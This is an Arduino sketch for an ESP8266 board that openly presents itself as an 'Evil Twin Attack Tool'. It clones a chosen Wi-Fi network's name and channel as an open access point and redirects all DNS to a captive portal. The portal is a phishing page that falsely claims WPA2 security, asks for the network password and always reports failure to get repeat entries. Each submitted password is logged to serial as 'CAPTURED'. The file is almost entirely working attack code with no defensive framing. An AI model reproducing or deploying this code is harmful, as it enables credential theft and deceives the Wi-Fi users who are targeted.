#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

// Configuration
#define LED_PIN 2                // Built-in LED on most ESP8266 boards (LOW = ON)
#define SERIAL_BAUD 115200       // Serial communication speed
#define MAX_SSID_LENGTH 32       // Maximum SSID length
#define HEARTBEAT_INTERVAL 5000  // Heartbeat message interval (ms)
#define EEPROM_SIZE 512          // EEPROM storage size
#define EEPROM_MAGIC 0xF1UL      // Magic number to validate EEPROM data

// Structures for storing AP information
struct APInfo {
  char ssid[MAX_SSID_LENGTH + 1];
  uint8_t bssid[6];
  uint8_t channel;
};

// Global variables
APInfo targetAP;                 // Target AP information
DNSServer dnsServer;             // DNS server for captive portal
ESP8266WebServer webServer(80);  // Web server for captive portal
unsigned long lastHeartbeat = 0; // Timestamp of last heartbeat
bool apActive = false;           // Flag for AP active status
uint8_t defaultChannel = 8;      // Default channel if none specified

// Function prototypes
void initHardware();
void processSerialCommands();
void parseTargetCommand(String command);
bool parseBSSID(String bssidStr, uint8_t *bssid);
void startAP();
void stopAP();
void sendHeartbeat();
void blinkLED(int times, int delayMs);
void saveToEEPROM();
void loadFromEEPROM();
void resetESP();
void displayStatus();
void runDiagnostics();
void setupCaptivePortal();
void setupWebServer();
void scanForAPs();
void handleConnect();
void handleRoot();
void handleNotFound();
String macToString(const uint8_t* mac);

void setup() {
  // Initialize hardware
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH); // LED off initially
  
  // Initialize serial communication
  Serial.begin(SERIAL_BAUD);
  while (!Serial) { delay(10); } // Short delay to allow serial to initialize
  
  Serial.println("\n\n[INIT] ESP8266 Evil Twin Attack Tool");
  Serial.println("[INIT] Initializing hardware...");
  
  // Initialize WiFi
  WiFi.mode(WIFI_OFF);
  delay(100);
  WiFi.mode(WIFI_STA);
  delay(100);
  
  // Initialize EEPROM
  EEPROM.begin(EEPROM_SIZE);
  
  // Initialize target AP structure
  memset(targetAP.ssid, 0, sizeof(targetAP.ssid));
  memset(targetAP.bssid, 0, sizeof(targetAP.bssid));
  targetAP.channel = defaultChannel;
  
  // Try to load target from EEPROM
  loadFromEEPROM();
  
  // Blink LED to indicate successful initialization
  blinkLED(2, 500);
  
  Serial.println("[INIT] Initialization complete");
  Serial.println("[READY] Type HELP for available commands");
}

void loop() {
  // Process commands from serial
  processSerialCommands();
  
  // Handle captive portal if AP is active
  if (apActive) {
    dnsServer.processNextRequest();
    webServer.handleClient();
  }
  
  
  // Send heartbeat message periodically
  if (millis() - lastHeartbeat > HEARTBEAT_INTERVAL) {
    sendHeartbeat();
  }
}

// Display current status
void displayStatus() {
  Serial.println("[STATUS] Current status:");
  Serial.println("  ESP8266 Uptime: " + String(millis() / 1000) + " seconds");
  Serial.println("  WiFi Mode: " + String(WiFi.getMode() == WIFI_AP ? "AP" : 
                                         (WiFi.getMode() == WIFI_STA ? "Station" : 
                                         (WiFi.getMode() == WIFI_AP_STA ? "AP+Station" : "Off"))));
  Serial.println("  AP Active: " + String(apActive ? "Yes" : "No"));
  
  if (strlen(targetAP.ssid) > 0) {
    Serial.println("  Target AP:");
    Serial.println("    SSID: " + String(targetAP.ssid));
    Serial.print("    BSSID: ");
    for (int i = 0; i < 6; i++) {
      if (targetAP.bssid[i] < 0x10) Serial.print("0");
      Serial.print(targetAP.bssid[i], HEX);
      if (i < 5) Serial.print(":");
    }
    Serial.println();
    Serial.println("    Channel: " + String(targetAP.channel));
  } else {
    Serial.println("  Target AP: Not set");
  }
  
  if (apActive) {
    Serial.println("  AP Info:");
    Serial.println("    SSID: " + WiFi.softAPSSID());
    Serial.println("    IP Address: " + WiFi.softAPIP().toString());
    Serial.println("    MAC Address: " + WiFi.softAPmacAddress());
    Serial.println("    Channel: " + String(WiFi.channel()));
    Serial.println("    Connected Clients: " + String(WiFi.softAPgetStationNum()));
  }
  
  Serial.println("  Free Heap: " + String(ESP.getFreeHeap()) + " bytes");
}

// Run diagnostics
void runDiagnostics() {
  Serial.println("[DIAG] Running diagnostics...");
  Serial.println("[DIAG] Hardware Information:");
  Serial.println("  Chip ID: " + String(ESP.getChipId(), HEX));
  Serial.println("  Flash Chip ID: " + String(ESP.getFlashChipId(), HEX));
  Serial.println("  Flash Chip Size: " + String(ESP.getFlashChipSize()) + " bytes");
  Serial.println("  Flash Chip Real Size: " + String(ESP.getFlashChipRealSize()) + " bytes");
  Serial.println("  Flash Chip Speed: " + String(ESP.getFlashChipSpeed() / 1000000) + " MHz");
  Serial.println("  CPU Frequency: " + String(ESP.getCpuFreqMHz()) + " MHz");
  Serial.println("  SDK Version: " + String(ESP.getSdkVersion()));
  Serial.println("  Free Heap: " + String(ESP.getFreeHeap()) + " bytes");
  Serial.println("  Sketch Size: " + String(ESP.getSketchSize()) + " bytes");
  Serial.println("  Free Sketch Space: " + String(ESP.getFreeSketchSpace()) + " bytes");
  
  Serial.println("[DIAG] WiFi Diagnostics:");
  Serial.println("  WiFi Mode: " + String(WiFi.getMode()));
  Serial.print("  WiFi Channel: ");
  Serial.println(WiFi.channel());
  
  Serial.println("[DIAG] Testing WiFi functions...");
  
  // Test AP creation
  WiFi.mode(WIFI_OFF);
  delay(100);
  WiFi.mode(WIFI_AP);
  delay(100);
  
  bool testResult = WiFi.softAP("ESP_DIAG_TEST", "", defaultChannel, false, 4);
  Serial.println("  Test AP creation: " + String(testResult ? "SUCCESS" : "FAILED"));
  if (testResult) {
    Serial.println("  Test AP Channel: " + String(WiFi.channel()));
    
    // Check if the channel was set correctly
    if (WiFi.channel() != defaultChannel) {
      Serial.println("[DIAG] CHANNEL ISSUE DETECTED: WiFi channel not correctly set!");
      Serial.println("  Requested channel: " + String(defaultChannel));
      Serial.println("  Actual channel: " + String(WiFi.channel()));
      Serial.println("  This may indicate hardware/driver issues with channel setting");
    }
    
    WiFi.softAPdisconnect(true);
    delay(100);
  }
  
  Serial.println("[DIAG] Testing packet injection...");
  WiFi.mode(WIFI_STA);
  delay(100);
  
  uint8_t testPacket[26] = {0};
  int result = wifi_send_pkt_freedom(testPacket, 26, 0);
  Serial.println("  Packet injection test: " + String(result == 0 ? "SUCCESS" : "FAILED"));
  
  Serial.println("[DIAG] Diagnostics complete");
}

// Send heartbeat message
void sendHeartbeat() {
  Serial.println("[HEARTBEAT] ESP8266 Evil Twin is running");
  Serial.println("[STATUS] AP: " + String(apActive ? "Active" : "Inactive") + 
                 ", Channel: " + String(targetAP.channel));
  lastHeartbeat = millis();
}

// Blink LED
void blinkLED(int times, int delayMs) {
  for (int i = 0; i < times; i++) {
    digitalWrite(LED_PIN, LOW);  // LED on
    delay(delayMs);
    digitalWrite(LED_PIN, HIGH); // LED off
    delay(delayMs);
  }
}

// Save target information to EEPROM
void saveToEEPROM() {
  uint16_t addr = 0;
  
  // Write magic number
  EEPROM.write(addr++, (EEPROM_MAGIC >> 8) & 0xFF);
  EEPROM.write(addr++, EEPROM_MAGIC & 0xFF);
  
  // Write SSID
  EEPROM.write(addr++, strlen(targetAP.ssid));
  for (unsigned int i = 0; i < strlen(targetAP.ssid); i++) {
    EEPROM.write(addr++, targetAP.ssid[i]);
  }
  
  // Write BSSID
  for (int i = 0; i < 6; i++) {
    EEPROM.write(addr++, targetAP.bssid[i]);
  }
  
  // Write channel
  EEPROM.write(addr++, targetAP.channel);
  
  // Commit changes
  EEPROM.commit();
  
  Serial.println("[EEPROM] Target information saved");
}

// Load target information from EEPROM
void loadFromEEPROM() {
  uint16_t addr = 0;
  
  // Check magic number
  uint16_t magic = (EEPROM.read(addr++) << 8) | EEPROM.read(addr++);
  if (magic != EEPROM_MAGIC) {
    Serial.println("[EEPROM] No valid data found");
    return;
  }
  
  // Read SSID
  uint8_t ssidLen = EEPROM.read(addr++);
  if (ssidLen > MAX_SSID_LENGTH) {
    Serial.println("[EEPROM] Invalid SSID length");
    return;
  }
  
  memset(targetAP.ssid, 0, sizeof(targetAP.ssid));
  for (uint8_t i = 0; i < ssidLen; i++) {
    targetAP.ssid[i] = EEPROM.read(addr++);
  }
  
  // Read BSSID
  for (int i = 0; i < 6; i++) {
    targetAP.bssid[i] = EEPROM.read(addr++);
  }
  
  // Read channel
  targetAP.channel = EEPROM.read(addr++);
  if (targetAP.channel < 1 || targetAP.channel > 14) {
    targetAP.channel = defaultChannel; // Use default channel 8 if invalid
  }
  
  Serial.println("[EEPROM] Target information loaded:");
  Serial.println("  SSID: " + String(targetAP.ssid));
  Serial.print("  BSSID: ");
  for (int i = 0; i < 6; i++) {
    if (targetAP.bssid[i] < 0x10) Serial.print("0");
    Serial.print(targetAP.bssid[i], HEX);
    if (i < 5) Serial.print(":");
  }
  Serial.println();
  Serial.println("  Channel: " + String(targetAP.channel));
}

// Setup captive portal
void setupCaptivePortal() {
  // Start DNS server
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(53, "*", WiFi.softAPIP());
  
  // Set up web server handlers
  setupWebServer();
  
  Serial.print("[PORTAL] Captive portal started at IP: ");
  Serial.println(WiFi.softAPIP());
}

// Handle root path
void handleRoot() {
  String html = R"html(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure WiFi Authentication</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary: #2563eb;
      --primary-dark: #1d4ed8;
      --secondary: #0ea5e9;
      --success: #10b981;
      --warning: #f59e0b;
      --danger: #ef4444;
      --dark: #1e293b;
      --light: #f8fafc;
      --gray: #64748b;
      --border: #e2e8f0;
      --card-bg: #ffffff;
      --card-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 8px 10px -6px rgba(0, 0, 0, 0.05);
      --transition: all 0.3s ease;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
      color: var(--dark);
      line-height: 1.6;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .container {
      max-width: 480px;
      width: 100%;
      margin: 0 auto;
    }

    .card {
      background: var(--card-bg);
      border-radius: 16px;
      box-shadow: var(--card-shadow);
      overflow: hidden;
      position: relative;
      z-index: 1;
    }

    .card-header {
      background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
      color: white;
      padding: 30px 30px 20px;
      text-align: center;
      position: relative;
      overflow: hidden;
    }

    .card-header::before {
      content: "";
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: radial-gradient(circle, rgba(255,255,255,0.15) 0%, rgba(255,255,255,0) 70%);
      transform: rotate(30deg);
    }

    .logo {
      display: flex;
      justify-content: center;
      margin-bottom: 15px;
    }

    .logo-icon {
      background: white;
      width: 70px;
      height: 70px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
    }

    .logo-icon i {
      font-size: 32px;
      color: var(--primary);
    }

    h1 {
      font-family: 'Poppins', sans-serif;
      font-weight: 700;
      font-size: 28px;
      margin-bottom: 5px;
      letter-spacing: -0.5px;
    }

    .subtitle {
      font-weight: 400;
      font-size: 16px;
      opacity: 0.9;
      margin-bottom: 20px;
    }

    .card-body {
      padding: 30px;
    }

    .network-info {
      display: flex;
      align-items: center;
      background: #f1f5f9;
      border-radius: 12px;
      padding: 15px;
      margin-bottom: 25px;
    }

    .network-icon {
      background: var(--primary);
      color: white;
      width: 40px;
      height: 40px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-right: 15px;
      flex-shrink: 0;
    }

    .network-details {
      flex-grow: 1;
    }

    .network-name {
      font-weight: 600;
      font-size: 18px;
      color: var(--dark);
      margin-bottom: 3px;
    }

    .network-status {
      font-size: 14px;
      color: var(--gray);
      display: flex;
      align-items: center;
    }

    .status-indicator {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: var(--warning);
      margin-right: 8px;
    }

    .form-group {
      margin-bottom: 20px;
      position: relative;
    }

    label {
      display: block;
      font-weight: 500;
      margin-bottom: 8px;
      font-size: 14px;
    }

    .input-group {
      position: relative;
    }

    input[type="password"] {
      width: 100%;
      padding: 14px 45px 14px 15px;
      border: 2px solid var(--border);
      border-radius: 10px;
      font-size: 16px;
      transition: var(--transition);
      background: #f8fafc;
    }

    input[type="password"]:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15);
    }

    .toggle-password {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      color: var(--gray);
      cursor: pointer;
      font-size: 18px;
      padding: 5px;
      transition: var(--transition);
    }

    .toggle-password:hover {
      color: var(--dark);
    }

    .password-strength {
      margin-top: 8px;
      font-size: 13px;
      display: flex;
      align-items: center;
    }

    .strength-meter {
      height: 4px;
      flex-grow: 1;
      background: #e2e8f0;
      border-radius: 2px;
      margin-left: 10px;
      overflow: hidden;
    }

    .strength-fill {
      height: 100%;
      width: 0%;
      background: var(--warning);
      transition: var(--transition);
    }

    button {
      width: 100%;
      padding: 16px;
      background: linear-gradient(to right, var(--primary), var(--secondary));
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      font-size: 16px;
      font-weight: 600;
      transition: var(--transition);
      box-shadow: 0 4px 6px rgba(37, 99, 235, 0.2);
      position: relative;
      overflow: hidden;
    }

    button:hover {
      background: linear-gradient(to right, var(--primary-dark), var(--primary));
      box-shadow: 0 6px 8px rgba(37, 99, 235, 0.3);
    }

    button:active {
      transform: translateY(2px);
    }

    .loading {
      display: none;
      text-align: center;
      margin-top: 25px;
    }

    .spinner {
      border: 4px solid rgba(0, 0, 0, 0.1);
      border-left-color: var(--primary);
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 0 auto 15px;
    }

    .loading-text {
      font-weight: 500;
      color: var(--gray);
    }

    .error-message {
      display: none;
      background: rgba(239, 68, 68, 0.1);
      color: var(--danger);
      padding: 12px 15px;
      border-radius: 8px;
      margin-top: 15px;
      font-size: 14px;
      border-left: 3px solid var(--danger);
    }

    .card-footer {
      padding: 0 30px 25px;
      text-align: center;
      color: var(--gray);
      font-size: 13px;
    }

    .footer-links {
      margin-top: 15px;
      display: flex;
      justify-content: center;
      gap: 20px;
    }

    .footer-links a {
      color: var(--gray);
      text-decoration: none;
      transition: var(--transition);
    }

    .footer-links a:hover {
      color: var(--primary);
    }

    .security-info {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      margin-top: 20px;
      font-size: 13px;
      color: var(--success);
      font-weight: 500;
    }

    .security-info i {
      font-size: 16px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    @media (max-width: 480px) {
      .card-header {
        padding: 25px 20px 15px;
      }
      
      .card-body {
        padding: 25px 20px;
      }
      
      h1 {
        font-size: 24px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="card">
      <div class="card-header">
        <div class="logo">
          <div class="logo-icon">
            <i class="fas fa-wifi"></i>
          </div>
        </div>
        <h1>Secure WiFi Authentication</h1>
        <div class="subtitle">Please verify your identity to access the network</div>
      </div>
      
      <div class="card-body">
        <div class="network-info">
          <div class="network-icon">
            <i class="fas fa-network-wired"></i>
          </div>
          <div class="network-details">
            <div class="network-name" id="networkName">Corporate Guest Network</div>
            <div class="network-status">
              <div class="status-indicator"></div>
              <span>Authentication required</span>
            </div>
          </div>
        </div>
        
        <p style="margin-bottom: 20px; color: var(--gray);">For your security, please enter the network password to reconnect. Your connection is encrypted and secure.</p>
        
        <form id="wifiForm" onsubmit="return submitForm()">
          <div class="form-group">
            <label for="password">Network Password</label>
            <div class="input-group">
              <input type="password" id="password" name="password" required placeholder="Enter your password">
              <button type="button" class="toggle-password" id="togglePassword">
                <i class="fas fa-eye"></i>
              </button>
            </div>
            <div class="password-strength">
              <span>Password strength:</span>
              <div class="strength-meter">
                <div class="strength-fill" id="strengthFill"></div>
              </div>
            </div>
          </div>
          
          <button type="submit" id="submitBtn">
            <span>Connect to Network</span>
          </button>
        </form>
        
        <div class="error-message" id="errorMessage">
          <i class="fas fa-exclamation-circle"></i> Authentication failed. Please try again with the correct password.
        </div>
        
        <div class="loading" id="loading">
          <div class="spinner"></div>
          <p class="loading-text">Verifying your credentials...</p>
        </div>
        
        <div class="security-info">
          <i class="fas fa-lock"></i>
          <span>Your connection is secured with WPA2 encryption</span>
        </div>
      </div>
      
      <div class="card-footer">
        <p>By connecting, you agree to our network usage policies</p>
        <div class="footer-links">
          <a href="#">Terms of Service</a>
          <a href="#">Privacy Policy</a>
          <a href="#">Help Center</a>
        </div>
      </div>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const passwordInput = document.getElementById('password');
      const togglePassword = document.getElementById('togglePassword');
      const strengthFill = document.getElementById('strengthFill');
      
      // Toggle password visibility
      togglePassword.addEventListener('click', function() {
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
        this.innerHTML = type === 'password' ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
      });
      
      // Password strength indicator
      passwordInput.addEventListener('input', function() {
        const password = this.value;
        let strength = 0;
        
        if (password.length > 0) strength += 20;
        if (password.length >= 8) strength += 20;
        if (/[A-Z]/.test(password)) strength += 20;
        if (/[0-9]/.test(password)) strength += 20;
        if (/[^A-Za-z0-9]/.test(password)) strength += 20;
        
        strengthFill.style.width = strength + '%';
        
        if (strength < 40) {
          strengthFill.style.backgroundColor = '#ef4444';
        } else if (strength < 80) {
          strengthFill.style.backgroundColor = '#f59e0b';
        } else {
          strengthFill.style.backgroundColor = '#10b981';
        }
      });
      
      // Simulate network name from external variable
      document.getElementById('networkName').textContent = "Corporate Guest Network";
    });
    
    function submitForm() {
      const password = document.getElementById('password').value;
      const form = document.getElementById('wifiForm');
      const loading = document.getElementById('loading');
      const errorMessage = document.getElementById('errorMessage');
      
      // Hide form and error, show loading
      form.style.display = 'none';
      errorMessage.style.display = 'none';
      loading.style.display = 'block';
      
      // Simulate API call
      fetch('/connect', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'password=' + encodeURIComponent(password)
      })
      .then(response => {
        // Simulate response delay
        setTimeout(() => {
          // Always show error for this demo
          loading.style.display = 'none';
          errorMessage.style.display = 'block';
          form.style.display = 'block';
          
          // In a real implementation, you would check response status
          // if (response.ok) {
          //   // Success action
          // } else {
          //   errorMessage.style.display = 'block';
          //   form.style.display = 'block';
          // }
        }, 2000);
      })
      .catch(error => {
        setTimeout(() => {
          loading.style.display = 'none';
          errorMessage.style.display = 'block';
          form.style.display = 'block';
        }, 2000);
      });
      
      return false;
    }
  </script>
</body>
</html>
  )html";
  
  webServer.send(200, "text/html", html);
  
  // Log captive portal access
  Serial.println("[PORTAL] Client accessed captive portal");
}

// Handle 404 requests (redirect to root)
void handleNotFound() {
  // For all other URLs, redirect to the root page
  webServer.sendHeader("Location", "/", true);
  webServer.send(302, "text/plain", "");
}


// Helper function to convert MAC to string
String macToString(const uint8_t* mac) {
  char macStr[18] = {0};
  sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}

// Start Evil Twin AP
void startAP() {
  Serial.println("[AP] Starting Evil Twin AP...");
  
  // First stop any existing AP
  WiFi.softAPdisconnect(true);
  delay(500);
  
  // Check if we have target information
  if (strlen(targetAP.ssid) == 0) {
    Serial.println("[WARNING] No target set. Using default SSID and channel 8");
    strcpy(targetAP.ssid, "FreeWiFi");
    targetAP.channel = defaultChannel; // Use channel 8 by default
  }
  
  // Set WiFi mode to AP
  WiFi.mode(WIFI_OFF);
  delay(100);
  WiFi.mode(WIFI_AP);
  delay(100);
  
  Serial.println("[AP] Setting channel to " + String(targetAP.channel));
  
  // Start softAP with open authentication
  Serial.print("[AP] Starting softAP with SSID: ");
  Serial.println(targetAP.ssid);
  Serial.print("[AP] On channel: ");
  Serial.println(targetAP.channel);
  
  // Start the AP with no password (open network)
  if (WiFi.softAP(targetAP.ssid, "", targetAP.channel, false, 8)) {
    Serial.println("[SUCCESS] AP started successfully");
    apActive = true;
    
    // Setup DNS and web server for captive portal
    setupCaptivePortal();
    
    // Turn on LED to indicate AP is active
    digitalWrite(LED_PIN, LOW); // LED on
  } else {
    Serial.println("[ERROR] Failed to start AP");
    Serial.println("[DEBUG] Attempting fallback method...");
    
    // Fallback method
    WiFi.mode(WIFI_OFF);
    delay(500);
    WiFi.mode(WIFI_AP);
    delay(500);
    
    if (WiFi.softAP(targetAP.ssid, "", targetAP.channel)) {
      Serial.println("[SUCCESS] AP started with fallback method");
      apActive = true;
      
      // Setup DNS and web server for captive portal
      setupCaptivePortal();
      
      // Turn on LED to indicate AP is active
      digitalWrite(LED_PIN, LOW); // LED on
    } else {
      Serial.println("[ERROR] AP start failed even with fallback method");
      apActive = false;
      // Blink LED to indicate failure
      blinkLED(3, 300);
    }
  }
  
  // Display current WiFi status
  Serial.print("[AP] Current WiFi channel: ");
  Serial.println(WiFi.channel());
  Serial.print("[AP] Current SSID: ");
  Serial.println(WiFi.softAPSSID());
}

// Stop Evil Twin AP
void stopAP() {
  Serial.println("[AP] Stopping Evil Twin AP");
  
  // Stop DNS and web server
  dnsServer.stop();
  webServer.stop();
  
  // Stop softAP
  WiFi.softAPdisconnect(true);
  delay(100);
  
  // Reset WiFi mode to station
  WiFi.mode(WIFI_OFF);
  delay(100);
  WiFi.mode(WIFI_STA);
  delay(100);
  
  apActive = false;
  Serial.println("[SUCCESS] AP stopped");
  
  // Turn off LED
  digitalWrite(LED_PIN, HIGH); // LED off
}

// Parse TARGET command
void parseTargetCommand(String command) {
  int firstSep = command.indexOf('|');
  int secondSep = command.lastIndexOf('|');
  
  if (firstSep == -1 || secondSep == -1 || firstSep == secondSep) {
    Serial.println("[ERROR] Invalid TARGET format. Use TARGET:SSID|BSSID|CHANNEL");
    return;
  }
  
  // Extract SSID
  String ssid = command.substring(0, firstSep);
  if (ssid.length() > MAX_SSID_LENGTH) {
    Serial.println("[ERROR] SSID too long (max " + String(MAX_SSID_LENGTH) + " chars)");
    return;
  }
  
  // Extract BSSID
  String bssidStr = command.substring(firstSep + 1, secondSep);
  uint8_t bssid[6];
  if (!parseBSSID(bssidStr, bssid)) {
    Serial.println("[ERROR] Invalid BSSID format. Use XX:XX:XX:XX:XX:XX");
    return;
  }
  
  // Extract channel
  String channelStr = command.substring(secondSep + 1);
  int channel = channelStr.toInt();
  if (channel < 1 || channel > 14) {
    Serial.println("[ERROR] Invalid channel (1-14): " + channelStr);
    Serial.println("[INFO] Using default channel 8 instead");
    channel = defaultChannel; // Use default channel 8
  }
  
  // Store target information
  memset(targetAP.ssid, 0, sizeof(targetAP.ssid));
  strcpy(targetAP.ssid, ssid.c_str());
  memcpy(targetAP.bssid, bssid, 6);
  targetAP.channel = channel;
  
  // Save to EEPROM
  saveToEEPROM();
  
  Serial.println("[SUCCESS] Target AP set");
  Serial.println("  SSID: " + String(targetAP.ssid));
  Serial.print("  BSSID: ");
  for (int i = 0; i < 6; i++) {
    if (targetAP.bssid[i] < 0x10) Serial.print("0");
    Serial.print(targetAP.bssid[i], HEX);
    if (i < 5) Serial.print(":");
  }
  Serial.println();
  Serial.println("  Channel: " + String(targetAP.channel));
}

// Parse BSSID string into byte array
bool parseBSSID(String bssidStr, uint8_t *bssid) {
  // Remove all non-hex characters for more flexible parsing
  String hexOnly = "";
  for (unsigned int i = 0; i < bssidStr.length(); i++) {
    char c = bssidStr.charAt(i);
    if (isHexadecimalDigit(c)) {
      hexOnly += c;
    }
  }
  
  // Check if we have exactly 12 hex characters
  if (hexOnly.length() != 12) {
    return false;
  }
  
  // Convert to byte array
  for (int i = 0; i < 6; i++) {
    String byteStr = hexOnly.substring(i * 2, i * 2 + 2);
    bssid[i] = strtol(byteStr.c_str(), NULL, 16);
  }
  
  return true;
}

// Reset ESP8266
void resetESP() {
  Serial.println("[SYSTEM] Resetting ESP8266...");
  delay(100);
  ESP.restart();
}

void scanForAPs() {
  Serial.println("[SCAN] Scanning for access points...");
  
  // Stop AP if active
  bool wasAPActive = apActive;
  
  if (apActive) {
    stopAP();
  }
  
  // Set WiFi mode to station
  WiFi.mode(WIFI_STA);
  delay(100);
  
  // Start scan
  int networksFound = WiFi.scanNetworks();
  
  if (networksFound == 0) {
    Serial.println("[SCAN] No networks found");
  } else {
    Serial.println("[SCAN] Found " + String(networksFound) + " networks:");
    Serial.println("NUM | SSID                           | BSSID             | CHANNEL | RSSI");
    Serial.println("----+--------------------------------+-------------------+---------+-----");
    
    for (int i = 0; i < networksFound; i++) {
      // Format output
      String num = String(i);
      if (num.length() < 2) num = " " + num;
      
      String ssid = WiFi.SSID(i);
      if (ssid.length() > 30) {
        ssid = ssid.substring(0, 27) + "...";
      } else {
        while (ssid.length() < 30) {
          ssid += " ";
        }
      }
      
      String bssid = WiFi.BSSIDstr(i);
      
      String channel = String(WiFi.channel(i));
      if (channel.length() < 3) channel = " " + channel;
      if (channel.length() < 3) channel = " " + channel;
      
      String rssi = String(WiFi.RSSI(i));
      if (rssi.length() < 3) rssi = " " + rssi;
      
      Serial.println(" " + num + " | " + ssid + " | " + bssid + " | " + channel + "    | " + rssi);
    }
  }
  
  // Free memory
  WiFi.scanDelete();
  
  // Restore previous state
  if (wasAPActive) {
    startAP();
  }

  Serial.println("[SCAN] Scan complete");
}

// Process commands from serial (continued)
void processSerialCommands() {
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();
    
    Serial.println("[CMD] Received: " + command);
    
    // Convert command to uppercase for easier comparison
    command.toUpperCase();
    
    if (command.startsWith("TARGET:")) {
      parseTargetCommand(command.substring(7));
    }
    else if (command == "START_AP") {
      startAP();
    }
    else if (command == "STOP_AP") {
      stopAP();
    }
    else if (command == "STATUS") {
      displayStatus();
    }
    else if (command == "RESET") {
      resetESP();
    }
    else if (command == "DIAGNOSTICS" || command == "DIAG") {
      runDiagnostics();
    }
    else if (command == "SAVE") {
      saveToEEPROM();
    }
    else if (command == "LOAD") {
      loadFromEEPROM();
    }
    else if (command == "CLEAR_TARGET") {
      // Clear target AP information
      memset(targetAP.ssid, 0, sizeof(targetAP.ssid));
      memset(targetAP.bssid, 0, sizeof(targetAP.bssid));
      targetAP.channel = defaultChannel;
      Serial.println("[SUCCESS] Target AP information cleared");
    }
    else if (command == "HELP") {
      // Display help message
      Serial.println("\n[HELP] Available commands:");
      Serial.println("  TARGET:SSID|BSSID|CHANNEL - Set target AP information");
      Serial.println("  START_AP - Start Evil Twin AP");
      Serial.println("  STOP_AP - Stop Evil Twin AP");
      Serial.println("  STATUS - Display current status");
      Serial.println("  DIAG - Run diagnostics");
      Serial.println("  SAVE - Save target AP information to EEPROM");
      Serial.println("  LOAD - Load target AP information from EEPROM");
      Serial.println("  CLEAR_TARGET - Clear target AP information");
      Serial.println("  SCAN - Scan for available APs");
      Serial.println("  RESET - Reset ESP8266");
      Serial.println("  HELP - Display this help message");
    }
    else if (command == "SCAN") {
      // Scan for available APs
      scanForAPs();
    }
    else {
      Serial.println("[ERROR] Unknown command: " + command);
      Serial.println("Type HELP for available commands");
    }
  }
}

// Scan for available access points


// Handle web server POST requests for password capture
void handleConnect() {
  String password = "";
  
  if (webServer.hasArg("password")) {
    password = webServer.arg("password");
    
    // Log the captured password
    Serial.println("[CAPTURED] Password for SSID '" + String(targetAP.ssid) + "': " + password);
    
    // Flash LED to indicate password capture
    blinkLED(5, 100);
  }
  
  // Respond with a success message (this will likely never reach the client)
  webServer.send(200, "text/plain", "Connecting...");
}

// Setup the web server route handlers
void setupWebServer() {
  webServer.on("/", handleRoot);
  webServer.on("/connect", HTTP_POST, handleConnect);
  webServer.onNotFound(handleNotFound);
  webServer.begin();
}

// Add the password capture route to the setupCaptivePortal function


// Improved evil twin function 
void startEvilTwinAttack() {
  Serial.println("[ATTACK] Starting automated Evil Twin attack");
  
  // First, verify we have a target
  if (strlen(targetAP.ssid) == 0) {
    Serial.println("[ERROR] No target set. Set target with TARGET:SSID|BSSID|CHANNEL");
    return;
  }
  
  // Wait a bit for clients to disconnect
  //delay(2000);
  
  // Start AP
  startAP();
  
  Serial.println("[ATTACK] Evil Twin attack active. Waiting for victims...");
  Serial.println("  - Evil Twin AP running on channel: " + String(targetAP.channel));
}
// Stop the combined attack
void stopEvilTwinAttack() {
  Serial.println("[ATTACK] Stopping Evil Twin attack");
  
  
  // Stop AP
  stopAP();
  
  Serial.println("[ATTACK] Evil Twin attack stopped");
}
